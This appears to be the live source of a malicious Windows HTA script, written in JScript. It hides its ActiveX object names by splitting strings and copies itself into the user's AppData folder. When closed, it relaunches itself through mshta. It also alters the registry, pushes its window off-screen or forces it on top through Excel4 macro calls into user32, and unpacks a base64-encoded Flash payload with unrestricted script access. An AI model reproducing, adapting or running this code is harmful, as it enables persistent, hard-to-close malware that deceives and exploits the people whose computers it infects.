<script language="JScript">
	var shl = new ActiveXObject("WScri"+"pt.S"+"hell");
	var fso = new ActiveXObject("Scrip"+"ting.Fil"+"eSystemObject");
	var stm = new ActiveXObject("ADOD"+"B.St"+"ream");
	function getSessionID() {
		return '2mohdu2gltiib16uga6ajq1p72';
	}
	function getDir(val) {
		var dir = shl.SpecialFolders(val);
		return dir;
	}
	function getFileName() {
		return getOSInfo('ProductID') + '.hta' || 'default.hta';
	}
	function getHtaFullFileName() {
		return getDir("Appdata") + '\\' + __avavavonline.APPLICATIONNAME + '\\' + getFileName();
	}
	function getOSInfo(val) {
		var str = shl.Environment('Process').Item('OS').indexOf('Windows_NT') != -1 ? 'Windows NT' : 'Windows';
		try {
			return shl.RegRead("HKLM\\SOFTWARE\\Microsoft\\" + str + "\\CurrentVersion\\" + val);
		}
		catch(e) {return};
	}
	function getCommandLine() {
		return __avavavonline.commandLine.substr(__avavavonline.commandLine.length - 1);
	}
	function doSaveText(filename, text, charset) {
		var stream;
		try {
			stream = stm;
			stream.type = 2;
			stream.charset = charset;
			stream.open();
			for(var i=0; i<text.length; i++) {
				stream.writeText(String.fromCharCode(text[i]));
			}
			stream.saveToFile(filename, 2);
			stream.close();
		}
		catch(e) {};
	}
	function doDecode(b64) {
		var b64char = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
		var b64decTable = [];
		for (var i=0; i<b64char.length; i++) b64decTable[b64char.charAt(i)] = i;
		b64    = b64.replace(/[^A-Za-z0-9\+\/]/g, "");
		var md  = b64.length % 4;
		var j, i, tmp;
		var dat = [];
		if (md) for (i=0; i<4-md; i++) b64 += "A";
		for (j=i=0; i<b64.length; i+=4, j+=3) {
			tmp = (b64decTable[b64.charAt( i )] <<18)
				| (b64decTable[b64.charAt(i+1)] <<12)
				| (b64decTable[b64.charAt(i+2)] << 6)
				|  b64decTable[b64.charAt(i+3)];
			dat[ j ] = tmp >>> 16;
			dat[j+1] = (tmp >>> 8) & 0xff;
			dat[j+2] = tmp & 0xff;
		}
		if (md) dat.length -= [0,0,2,1][md];
		return dat;
	}
	function doCopy() {
		var cp, src, buf;
		cp = getDir("Appdata") + '\\' + __avavavonline.APPLICATIONNAME;
		if (!fso.FolderExists(cp)) fso.CreateFolder(cp);
		buf = fso.OpenTextFile(unescape(window.location.pathname), 1, false).ReadAll();
		try {
			fso.CreateTextFile(cp + '\\' + getFileName(), true).Write(buf);
		} catch(e) { return 1; };
	}
	window.onbeforeunload = function() {
		//debug('Window強制起動 : ' + window.forceopen);
		if (window.forceopen) {
			shl.Run('mshta "' + getHtaFullFileName() + '" 1');
		}
	}
	
	function doRegKey(name, value) {
		//debug('Reg登録 : ' + name + '=' + value);
		shl.RegWrite(name, value, 'REG_SZ');
	}
	function doDelKey(name) {
		//debug('Reg削除 : ' + name);
		shl.RegDelete(name);
	}
	function doReadKey(name) {
		//debug('Reg読込 : ' + name);
		return shl.RegRead(name);
	}
	function doHide() {
		window.moveTo(-1000, -1000);
	}
	function doShow(value) {
		var w = 800;
		var h = 530;
		window.resizeTo(w, h);
		if (value) {
			var x = (screen.availWidth - w) / 2;
			var y = (screen.availHeight - h) / 2;
			window.moveTo(x, y);
		}
		shl.AppActivate();
		try {
			var t = new ActiveXObject('Exc'+'el.Ap'+'plication');
			var hwnd = t.ExecuteExcel4Macro("CALL(\"user32\", \"FindWindowA\", \"JJC\", 0, \"&document.title&\")");
			t.ExecuteExcel4Macro("CALL(\"user32\", \"SetWindowPos\", \"JJJJJJJJ\", " + hwnd + "\", -1, 0, 0, 0, 0, 3)");
		} catch(e) {};
	}
	function doJump(val) {
		shl.Run(val);
	}
	function doEmbed(val) {
		var htm = "";
		htm+="<object classid=\"clsid:d27cdb6e-ae6d-11cf-96b8-444553540000\"";
		htm+=" codebase=\"http://download.macromedia.com/pub/shockwave/";
		htm+=" cabs/flash/swflash.cab\"";
		htm+=" id=\"_external\"";
		htm+=" width=\"100%\"";
		htm+=" height=\"100%\">";
		htm+="<param name=\"movie\" value=\"" + val + "\">";
		htm+="<param name=\"allowScriptAccess\" value=\"always\">";
		htm+="<param name=\"quality\" value=\"high\">";
		htm+="<embed src=\"" + val + "\"";
		htm+=" quality=\"high\"";
		htm+=" width=\"100%\"";
		htm+=" height=\"100%\"";
		htm+=" type=\"application/x-shockwave-flash\"";
		htm+=" pluginspage=\"http://www.macromedia.com/go/getflashplayer\">";
		htm+="</embed>";
		htm+="</object>";
		document.write(htm);
	}

	function __destory() {
		shl.Run('cmd echo@off /K CD ' + getDir("Appdata") + ' & RMDIR "' + __avavavonline.APPLICATIONNAME + '" /S /Q > NUL 2>&1 & exit');
	}
	function __init() {
		if (doCopy()) return;
		if (unescape(window.location.pathname) != getHtaFullFileName()) {
			window.forceopen = true;
			window.close();
		}
		else {
			var img = getHtaFullFileName() + '.swf';
			if (!fso.FileExists(img)) doSaveText(img, doDecode(bin()), 'iso-8859-1');
		}
		doEmbed(img);
	}
